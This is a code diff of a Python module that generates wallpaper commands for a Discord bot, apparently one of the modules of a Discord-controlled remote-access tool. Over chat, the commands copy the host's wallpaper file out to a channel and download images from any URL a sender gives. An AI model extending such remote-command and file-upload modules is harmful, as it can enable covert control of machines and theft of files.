@@ -8,22 +8,25 @@
 # -wallpaper set -l <www.link.to/file.png>
 # -wallpaper set -a (has attachment)
 
+def get_dependencies():
+    return """
+import os
+import shutil
+import discord
+import requests
+"""
+
 def get_code():
     return """
+
     elif message.content.lower() == "wallpaper get":
-        import os
-        import shutil
-        import discord
         path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Themes", "TranscodedWallpaper")
         shutil.copy(path, path + ".jpeg")
         file = discord.File(path + ".jpeg")
         await message.channel.send(file=file)
         os.remove(path + ".jpeg")
-        await message.channel.send("```diff\n+ Wallpaper\n```")
+        await message.channel.send("```diff\\n+ Wallpaper\\n```")
     elif message.content.lower().startswith("wallpaper set -l"):
-        import requests
-        import os
-        import discord
         url = message.content[17:]
         response = requests.get(url)
         path = os.path.join(os.getenv("TEMP"), "wallpaper.png")
@@ -33,15 +36,14 @@ def get_code():
         file = discord.File(path + ".jpeg")
         await message.channel.send(file=file)
         os.remove(path + ".jpeg")
-        await message.channel.send("```diff\n+ Wallpaper\n```")
+        await message.channel.send("```diff\\n+ Wallpaper\\n```")
     elif message.content.lower() == "wallpaper set -a":
-        import os
-        import discord
         path = os.path.join(os.getenv("TEMP"), "wallpaper.png")
         await message.attachments[0].save(path)
         os.rename(path, path + ".jpeg")
         file = discord.File(path + ".jpeg")
         await message.channel.send(file=file)
         os.remove(path + ".jpeg")
-        await message.channel.send("```diff\n+ Wallpaper\n```")
+        await message.channel.send("```diff\\n+ Wallpaper\\n```")
+        
 """
